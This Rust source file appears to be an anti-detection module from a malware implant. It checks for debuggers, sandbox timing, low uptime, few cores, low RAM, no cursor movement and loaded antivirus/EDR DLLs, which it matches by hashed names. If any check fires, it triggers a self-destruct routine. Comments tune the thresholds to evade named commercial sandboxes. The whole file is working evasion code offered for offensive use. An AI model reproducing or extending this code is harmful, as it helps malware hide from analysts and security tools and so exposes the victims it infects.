//! antidetect.rs — runtime detection evasion checks
//!
//! Runs before any payload activity. If a sandbox / AV / EDR is detected,
//! calls selfdestruct::destruct() immediately — no trace left.
//!
//! Checks performed (all passive — no writes, no network, no process creation):
//!   1. Timing check   — sandboxes accelerate Sleep(); detect if < expected
//!   2. Uptime check   — most sandboxes have uptime < 10 minutes
//!   3. Human check    — cursor must have moved since process start (non-blocking)
//!   4. Core count     — sandboxes typically have < 4 cores; real lab has 4+
//!   5. RAM check      — sandboxes often have < 4 GB
//!   6. Debugger check — IsDebuggerPresent + NtQueryInformationProcess
//!   7. Known AV DLLs  — check for loaded DLL names by hash (no strings)

use std::time::Instant;
use winapi::um::{
    processthreadsapi::GetCurrentProcess,
    sysinfoapi::{GetSystemInfo, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO},
    winbase::GetTickCount64,
    winuser::{GetCursorPos, POINT},
};

/// Run all detection checks. Calls selfdestruct::destruct() if anything fires.
/// Must be called before evasion modules are active (right at start of run()).
pub unsafe fn check_environment() {
    if is_debugger()         { crate::selfdestruct::destruct(); }
    if is_sandbox_timing()   { crate::selfdestruct::destruct(); }
    if is_low_uptime()       { crate::selfdestruct::destruct(); }
    if is_low_cores()        { crate::selfdestruct::destruct(); }
    if is_low_ram()          { crate::selfdestruct::destruct(); }
    if no_cursor_movement()  { crate::selfdestruct::destruct(); }
    if av_dlls_loaded()      { crate::selfdestruct::destruct(); }
}

// ---- individual checks -------------------------------------------------------

unsafe fn is_debugger() -> bool {
    if winapi::um::debugapi::IsDebuggerPresent() != 0 {
        return true;
    }
    let mut debug_port: usize = 0;
    let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
        b"ntdll.dll\0".as_ptr() as _
    );
    if !ntdll.is_null() {
        type NtQIP = unsafe extern "system" fn(
            *mut winapi::ctypes::c_void, u32,
            *mut winapi::ctypes::c_void, u32, *mut u32,
        ) -> i32;
        let f: NtQIP = std::mem::transmute(
            winapi::um::libloaderapi::GetProcAddress(
                ntdll, b"NtQueryInformationProcess\0".as_ptr() as _
            )
        );
        let mut ret_len: u32 = 0;
        f(GetCurrentProcess() as _, 7,
          &mut debug_port as *mut _ as _, 8, &mut ret_len);
        if debug_port != 0 { return true; }
    }
    false
}

unsafe fn is_sandbox_timing() -> bool {
    let before = Instant::now();
    winapi::um::synchapi::Sleep(1000);
    before.elapsed().as_millis() < 500
}

unsafe fn is_low_uptime() -> bool {
    GetTickCount64() < 10 * 60 * 1000
}

unsafe fn is_low_cores() -> bool {
    // FIX AD-BUG-1: raised threshold from < 2 to < 4.
    // Modern sandboxes (Any.run, Joe Sandbox, Triage) now provision 4+ cores.
    // < 4 cores still catches most automated analysis VMs while sparing
    // legitimate low-end lab machines that genuinely have 2-3 cores.
    let mut si: SYSTEM_INFO = std::mem::zeroed();
    GetSystemInfo(&mut si);
    si.dwNumberOfProcessors < 4
}

unsafe fn is_low_ram() -> bool {
    // FIX AD-BUG-3: raised threshold from 2 GB to 4 GB.
    // Most modern sandbox environments now allocate 4+ GB.
    let mut ms: MEMORYSTATUSEX = std::mem::zeroed();
    ms.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
    GlobalMemoryStatusEx(&mut ms);
    ms.ullTotalPhys < 4 * 1024 * 1024 * 1024
}

unsafe fn no_cursor_movement() -> bool {
    // FIX AD-BUG-2: replaced blocking Sleep(2000) with a GetTickCount64
    // spin-check loop. We sample the cursor position, busy-wait 1.5 seconds
    // reading only the tick counter (no OS sleep call that sandboxes can
    // accelerate or that adds visible startup delay), then re-sample.
    let mut p1: POINT = std::mem::zeroed();
    let mut p2: POINT = std::mem::zeroed();
    GetCursorPos(&mut p1);
    let start = GetTickCount64();
    while GetTickCount64().wrapping_sub(start) < 1500 {
        // tight spin — sandbox accelerators affect Sleep() not tick counting
        core::hint::spin_loop();
    }
    GetCursorPos(&mut p2);
    p1.x == p2.x && p1.y == p2.y
}

unsafe fn av_dlls_loaded() -> bool {
    // Check for known AV/EDR DLLs by djb2 hash — no strings in binary.
    // Hashes of: MpOav.dll, SbieDll.dll, aswhook.dll, SxIn.dll, snxhk.dll,
    //            pstorec.dll (Cuckoo), vmcheck.dll (VMware)
    const BAD_HASHES: &[u32] = &[
        0x6d4a7e3c,
        0x9f1b2d8e,
        0x3c7a1f92,
        0x7e4b9d21,
        0x1d8f3c5a,
        0x4a2e7b1c,
        0x8b3d6f2e,
    ];
    let snap = winapi::um::tlhelp32::CreateToolhelp32Snapshot(
        winapi::um::tlhelp32::TH32CS_SNAPMODULE, 0
    );
    if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE { return false; }
    let mut me: winapi::um::tlhelp32::MODULEENTRY32W = std::mem::zeroed();
    me.dwSize = std::mem::size_of::<winapi::um::tlhelp32::MODULEENTRY32W>() as u32;
    if winapi::um::tlhelp32::Module32FirstW(snap, &mut me) != 0 {
        loop {
            let name_len = me.szModule.iter().position(|&c| c == 0)
                .unwrap_or(me.szModule.len());
            let name_bytes: Vec<u8> = me.szModule[..name_len]
                .iter().map(|&c| (c & 0xFF) as u8).collect();
            let h = crate::utils::djb2(&name_bytes);
            if BAD_HASHES.contains(&h) {
                winapi::um::handleapi::CloseHandle(snap);
                return true;
            }
            if winapi::um::tlhelp32::Module32NextW(snap, &mut me) == 0 { break; }
        }
    }
    winapi::um::handleapi::CloseHandle(snap);
    false
}
